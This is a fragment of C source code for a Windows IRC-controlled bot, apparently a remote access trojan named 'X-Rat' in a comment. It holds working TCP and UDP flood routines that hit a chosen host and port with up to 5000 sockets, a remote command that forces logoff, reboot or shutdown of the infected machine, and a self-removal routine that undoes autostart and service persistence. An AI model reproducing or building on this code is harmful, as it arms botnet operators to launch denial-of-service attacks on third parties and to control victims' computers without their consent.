						if (!plugins[x].xStart(&MainStruct, &ExploitList, &threads, &plugins, Session, Param0, Param1, Param2, Param3, Param4, Param5, Param6, Param7, Param8, Param9))
							return false;

    
					break;
				}
			}
			if (x >= MAXPLUGINS)
			{
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "No free slots");
				return false;
			}
			else
				return true;
		}
	}
	return false;
}

//flood 127.0.0.1 25 1 100 50 0 1 "HELO ssxp.net"
bool XTCPFlood(SESSION* Session, char *Host, char *Port, char *Delay, char *Times, char *Sockets, char *Data)
{
	TCPFLOODTHREAD tcpflood;
	memset(&tcpflood, 0, sizeof(TCPFLOODTHREAD));

	tcpflood.RemoteHost = ((Host!="" && Host)?(Host):("127.0.0.1"));

	tcpflood.RemotePort = ((atoi(Port)>0 && atoi(Port)<=65535 && Port)?(atoi(Port)):(0)); //was 222 // maybe 0? :).. bad idea..checked already

	tcpflood.Delay = ((atoi(Delay)>0 && Delay)?(atoi(Delay)):(5));

	tcpflood.Times = ((atoi(Times)>0 && Times)?(atoi(Times)):(10));

	tcpflood.MaxSockets = ((atoi(Sockets)>0 && atoi(Sockets)<=5000 && Sockets)?(atoi(Sockets)):(1));

//	tcpflood.Random = ((Random && (atoi(Random)!=0 || !strcmpi(Random, "TRUE")))?(TRUE):(FALSE));

//	tcpflood.SendData = ((SendData && (atoi(SendData)!=0 || !strcmpi(SendData, "TRUE")))?(TRUE):(FALSE));

	strncpy(tcpflood.Data, (Data)?(Data):(""), sizeof(tcpflood.Data)-1);

	strcpy(tcpflood.Session.Destination, Session->Destination);
	tcpflood.Session.irc = Session->irc;
	tcpflood.Session.IsMaster = Session->IsMaster;
	strcpy(tcpflood.Session.Method, Session->Method);
	tcpflood.Session.Notice = Session->Notice;
	tcpflood.Session.Silent = Session->Silent;

	tcpflood.Threadnum = XAddThread(TCPFLOOD_THREAD, FALSE, NULL, "TCP Flood :: Flooding: %s:%d", tcpflood.RemoteHost, tcpflood.RemotePort);

	if (tcpflood.Threadnum == -1)
	{
		#ifdef DEBUG_SYSTEM
		dbg("XTCPFlood(), Error Starting XTCPFloodThread(), All Threads are Full, Error Code: %d", GetLastError());
		#endif
		memset(&tcpflood, 0, sizeof(TCPFLOODTHREAD));
//		xsend(client->CommandSocket, client->SecureKey, &client->IRCInfo, 3, "XTCPFlood(), Error Starting XTCPFloodThread(), All Threads are Full, Error Code: %d", GetLastError());

		return false;

	}

	if ((threads[tcpflood.Threadnum].ThreadHandle = CreateThread(NULL, 0, &XTcpFloodThread, (LPVOID)&tcpflood, 0, &threads[tcpflood.Threadnum].ID)))
	{
		for (int x = 0; x <= 30; x++)
		{
			Sleep(100);

			if (tcpflood.Gotit)
				break;
			else if (x == 30)
			{
				XKillThread(tcpflood.Threadnum, TRUE, TRUE);
				memset(&tcpflood, 0, sizeof(TCPFLOODTHREAD));
//				xsend(client->CommandSocket, client->SecureKey, &client->IRCInfo, 3, "Error Starting %s Thread, Error Code: %d", "TCP Flood", GetLastError());

				return false;
			}
			Sleep(250);
		}
	}
	else
	{
		XKillThread(tcpflood.Threadnum, TRUE, FALSE);
		memset(&tcpflood, 0, sizeof(TCPFLOODTHREAD));
//		xsend(client->CommandSocket, client->SecureKey, &client->IRCInfo, 3, "XTCPFlood(), Error Starting XTCPFloodThread(), Error Code: %d", GetLastError());
		return false;
	}

	return true;
}

//flood 127.0.0.1 25 1 100 50 0 1 "HELO ssxp.net"
bool XUDPFlood(SESSION* Session, char *Host, char *Port, char *Delay, char *Times, char *Sockets, char *Data)
{

	UDPFLOODTHREAD udpflood;
	memset(&udpflood, 0, sizeof(UDPFLOODTHREAD));

	udpflood.RemoteHost = ((Host!="" && Host)?(Host):("127.0.0.1"));

	udpflood.RemotePort = ((atoi(Port)>0 && atoi(Port)<=65535 && Port)?(atoi(Port)):(0)); //was 222 // maybe 0? :).. bad idea..checked already

	udpflood.Delay = ((atoi(Delay)>0 && Delay)?(atoi(Delay)):(5));

	udpflood.Times = ((atoi(Times)>0 && Times)?(atoi(Times)):(10));

	udpflood.MaxSockets = ((atoi(Sockets)>0 && atoi(Sockets)<=5000 && Sockets)?(atoi(Sockets)):(1));

//	flood.Random = ((Random && (atoi(Random)!=0 || !strcmpi(Random, "TRUE")))?(TRUE):(FALSE));

//	flood.SendData = ((SendData && (atoi(SendData)!=0 || !strcmpi(SendData, "TRUE")))?(TRUE):(FALSE));

	strncpy(udpflood.Data, (Data)?(Data):(""), sizeof(udpflood.Data)-1);

	strcpy(udpflood.Session.Destination, Session->Destination);
	udpflood.Session.irc = Session->irc;
	udpflood.Session.IsMaster = Session->IsMaster;
	strcpy(udpflood.Session.Method, Session->Method);
	udpflood.Session.Notice = Session->Notice;
	udpflood.Session.Silent = Session->Silent;

	udpflood.Threadnum = XAddThread(UDPFLOOD_THREAD, FALSE, NULL, "UDP Flood :: Flooding: %s:%d", udpflood.RemoteHost, udpflood.RemotePort);

	if (udpflood.Threadnum == -1)
	{
		#ifdef DEBUG_SYSTEM
		dbg("XTCPFlood(), Error Starting XUDPFloodThread(), All Threads are Full, Error Code: %d", GetLastError());
		#endif
//		xsend(client->CommandSocket, client->SecureKey, &client->IRCInfo, 3, "XUdpFlood(), Error Starting XTCPFloodThread(), All Threads are Full, Error Code: %d", GetLastError());
		memset(&udpflood, 0, sizeof(UDPFLOODTHREAD));

		return false;

	}

	if ((threads[udpflood.Threadnum].ThreadHandle = CreateThread(NULL, 0, &XUdpFloodThread, (LPVOID)&udpflood, 0, &threads[udpflood.Threadnum].ID)))
	{
		for (int x = 0; x <= 30; x++)
		{
			Sleep(100);

			if (udpflood.Gotit)
				break;
			else if (x == 30)
			{
				XKillThread(udpflood.Threadnum, TRUE, TRUE);
				memset(&udpflood, 0, sizeof(UDPFLOODTHREAD));
//				xsend(client->CommandSocket, client->SecureKey, &client->IRCInfo, 3, "Error Starting %s Thread, Error Code: %d", "UDP Flood", GetLastError());

				return false;
			}
			Sleep(250);
		}
	}
	else
	{
		XKillThread(udpflood.Threadnum, TRUE, FALSE);
		memset(&udpflood, 0, sizeof(UDPFLOODTHREAD));
//		xsend(client->CommandSocket, client->SecureKey, &client->IRCInfo, 3, "XUDPFlood(), Error Starting XTCPFloodThread(), Error Code: %d", GetLastError());
		return false;
	}

	return true;
}

bool XSystemControl(SESSION* Session, char *Type)
{
	UINT Flags;
	DWORD Reason;

	if (!Type)
		return true;
	else
	{
		if (!strcmpi(Type, "LOGOFF"))
		{
			Flags = EWX_FORCE_LOGOFF;
			Reason = 1;

			goto exec;
		}
		else if (!strcmpi(Type, "REBOOT") || !strcmpi(Type, "RESTART"))
		{
			Flags = EWX_SYSTEM_REBOOT;
			Reason = 2;

			goto exec;
		}
		else if (!strcmpi(Type, "SHUTDOWN"))
		{
			Flags = EWX_FORCE_SHUTDOWN;
			Reason = 3;

			goto exec;
		}
		else
			return false;
	}

exec:

		if (!ExitWindowsEx(Flags, Reason))
		{
			return false;
		}
		else
		{
			XIRCRawSend(Session->irc->sock, 0, "QUIT :~");
			return true;
		}
	
	return false;
}

bool XRemove(char *Message)
{
//	fclose(MainStruct.MainFile);



	XIRCRawSend(MainIrc.sock, 0, "QUIT :%s", (Message)?(Message):("Removing..."));

	MainStruct.Active = FALSE;

//	XKillThread(MainStruct.MainThreadnum, TRUE, TRUE);

	closesocket(MainIrc.sock);
//	closesocket(MainStruct.MainSocket);
//	closesocket(MainStruct.DataSocket);

//	XBroadcustMessage(client, "Removing X-Rat", TRUE);

//	XMassKickClients(client, FALSE, TRUE);

	if (GetFileAttributes(MainStruct.CurrentFilename) != INVALID_FILE_ATTRIBUTES)
		SetFileAttributes(MainStruct.CurrentFilename, FILE_ATTRIBUTE_NORMAL);

//	#ifndef PUBLIC_VERSION
//	if (MainStruct.Protected)
//		XSystemProtection(client, "UNHOOK", NULL);
//	#endif

//	DeleteFile("xHook.dll");



	#ifndef DLL_MODE
	if (!MainStruct.AsService)
		XAddAutoStart(NULL);

	if (MainStruct.IsNTBased)
		if (MainStruct.AsService)
			XDeleteService(NULL, XDefaultServiceName);

	if (MainStruct.IsNTBased)
		if (MainStruct.AsService)
			XServiceControlHandler(SERVICE_CONTROL_STOP);

	ExitProcess(0);
	#endif

//	#ifdef DLL_MODE
//	FreeLibrary(DllModule);
//	FreeLibraryAndExitThread(DllModule, 1);
//	#endif

	return true;
}

